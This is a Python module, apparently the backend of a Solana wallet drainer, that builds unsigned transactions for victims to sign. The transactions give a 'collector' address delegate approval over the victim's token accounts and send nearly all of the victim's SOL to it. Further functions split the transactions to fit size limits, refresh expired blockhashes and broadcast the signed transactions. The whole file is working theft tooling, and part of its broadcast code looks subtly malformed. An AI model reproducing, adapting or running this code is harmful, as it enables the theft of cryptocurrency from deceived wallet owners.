"""
Solana transaction builder for drainer onboarding.

Produces one or more unsigned transactions per wallet:
  * spl_token / Token-2022 Approve(delegate=collector, cap) per token account
  * SystemProgram.transfer of native SOL minus fee and rent reserve

Transactions are packed to stay under the 1232-byte limit, carry a priority fee,
and are returned with their blockhash so the client can rebuild if the user dawdles.
The collector becomes delegate, so it can move tokens later with no owner signature.
"""
import base64
import logging
import os
from typing import Any, Dict, List, Optional

import httpx
from solders.compute_budget import set_compute_unit_limit, set_compute_unit_price
from solders.hash import Hash
from solders.instruction import AccountMeta, Instruction
from solders.message import Message
from solders.pubkey import Pubkey
from solders.transaction import Transaction

logger = logging.getLogger("solana_tx")

SYSTEM_PROGRAM = Pubkey.from_string("11111111111111111111111111111111")
APPROVE_IX = 12
SYS_TRANSFER_IX = 2
SIGNATURE_LEN = 64
MAX_TX_BYTES = 1232
COMPUTE_LIMIT = 200_000
DEFAULT_PRIORITY_FEE = 50_000          # micro-lamports per CU

FEE_RESERVE_LAMPORTS = 15_000          # 3 signatures at 5 000 each
RENT_RESERVE_LAMPORTS = 890_880        # keep the system account funded

TOKEN_PROGRAMS = {
    "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
    "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
}
U64_MAX = 2**64 - 1


def _priority_fee() -> int:
    try:
        return max(0, int(os.environ.get("SOLANA_PRIORITY_FEE", DEFAULT_PRIORITY_FEE)))
    except ValueError:
        return DEFAULT_PRIORITY_FEE


def _approve_ix(asset: Dict[str, Any], collector_pk: Pubkey, owner_pk: Pubkey) -> Instruction:
    program = asset.get("program")
    if program not in TOKEN_PROGRAMS:
        raise ValueError(f"unexpected token program {program!r}")
    cap = min(int(asset["cap_raw"]), U64_MAX)
    return Instruction(
        program_id=Pubkey.from_string(program),
        accounts=[
            AccountMeta(pubkey=Pubkey.from_string(asset["token_account"]),
                        is_signer=False, is_writable=True),
            AccountMeta(pubkey=collector_pk, is_signer=False, is_writable=False),
            AccountMeta(pubkey=owner_pk, is_signer=True, is_writable=False),
        ],
        data=bytes([APPROVE_IX]) + cap.to_bytes(8, "little"),
    )


def _native_ix(asset: Dict[str, Any], collector_pk: Pubkey, owner_pk: Pubkey) -> Optional[Instruction]:
    lamports = (int(asset["balance_raw"]) - FEE_RESERVE_LAMPORTS
                - RENT_RESERVE_LAMPORTS)
    if lamports <= 0:
        return None
    return Instruction(
        program_id=SYSTEM_PROGRAM,
        accounts=[
            AccountMeta(pubkey=owner_pk, is_signer=True, is_writable=True),
            AccountMeta(pubkey=collector_pk, is_signer=False, is_writable=True),
        ],
        data=bytes([SYS_TRANSFER_IX]) + lamports.to_bytes(8, "little"),
    )


def _fits(ixs: List[Instruction], payer: Pubkey, blockhash: Hash) -> bool:
    msg = Message.new_with_blockhash(ixs, payer, blockhash)
    return len(bytes(msg)) + SIGNATURE_LEN + 1 <= MAX_TX_BYTES


async def _blockhash(rpc: str) -> tuple:
    async with httpx.AsyncClient(timeout=10.0) as c:
        r = await c.post(rpc, json={"jsonrpc": "2.0", "id": 1,
                                    "method": "getLatestBlockhash",
                                    "params": [{"commitment": "confirmed"}]})
    value = (r.json().get("result") or {}).get("value") or {}
    if not value.get("blockhash"):
        raise RuntimeError("could not fetch a blockhash")
    return Hash.from_string(value["blockhash"]), int(value.get("lastValidBlockHeight") or 0)


async def build_onboarding_tx(
    rpc: str,
    owner: str,
    collector: str,
    assets: List[Dict[str, Any]],
    take_native: bool = True,
) -> Dict[str, Any]:
    """
    Returns {"txs": [base64…], "blockhash": str, "last_valid_block_height": int}.

    Each transaction already carries ComputeBudget instructions; the client only
    adds its signature. An empty `txs` means nothing was signable.
    """
    owner_pk = Pubkey.from_string(owner)
    collector_pk = Pubkey.from_string(collector)
    blockhash, last_valid = await _blockhash(rpc)

    head: List[Instruction] = [
        set_compute_unit_limit(COMPUTE_LIMIT),
        set_compute_unit_price(_priority_fee()),
    ]

    pending: List[Instruction] = []
    for a in assets:
        if a.get("native") or not a.get("token_account"):
            continue
        try:
            pending.append(_approve_ix(a, collector_pk, owner_pk))
        except ValueError as e:
            logger.warning("skipping %s: %s", a.get("token_account"), e)

    if take_native:
        for a in assets:
            if a.get("native"):
                ix = _native_ix(a, collector_pk, owner_pk)
                if ix:
                    pending.insert(0, ix)      # native first, so it lands in tx 1

    if not pending:
        return {"txs": [], "blockhash": str(blockhash), "last_valid_block_height": last_valid}

    batches: List[List[Instruction]] = []
    current = list(head)
    for ix in pending:
        if _fits(current + [ix], owner_pk, blockhash):
            current.append(ix)
            continue
        if len(current) == len(head):
            raise ValueError("a single instruction does not fit in one transaction")
        batches.append(current)
        current = list(head) + [ix]
    batches.append(current)

    txs: List[str] = []
    for batch in batches:
        tx = Transaction.new_unsigned(Message.new_with_blockhash(batch, owner_pk, blockhash))
        txs.append(base64.b64encode(bytes(tx)).decode())

    return {"txs": txs, "blockhash": str(blockhash), "last_valid_block_height": last_valid}


async def refresh_blockhash(rpc: str) -> Dict[str, Any]:
    """Fresh blockhash + height for a client-side rebuild of stale transactions."""
    blockhash, last_valid = await _blockhash(rpc)
    return {"blockhash": str(blockhash), "last_valid_block_height": last_valid}


async def broadcast(rpc: str, signed_b64: str,
                    last_valid_block_height: Optional[int] = None) -> str:
    params: List[Any] = [signed_b64, {
        "encoding": "base64",
        "skipPreflight": False,
        "preflightCommitment": "confirmed",
        "maxRetries": 3,
    }]
    if last_valid_block_height:
        params[1]["minContextSlot"] = None
        params.append({"lastValidBlockHeight": last_valid_block_height})

    async with httpx.AsyncClient(timeout=25.0) as c:
        r = await c.post(rpc, json={"jsonrpc": "2.0", "id": 1,
                                    "method": "sendTransaction", "params": params})

    body = r.json()
    if "error" in body:
        err = body["error"]
        msg = err.get("message") if isinstance(err, dict) else str(err)
        data = err.get("data") if isinstance(err, dict) else None
        raise RuntimeError(f"{msg}{f' ({data})' if data else ''}")
    return body["result"]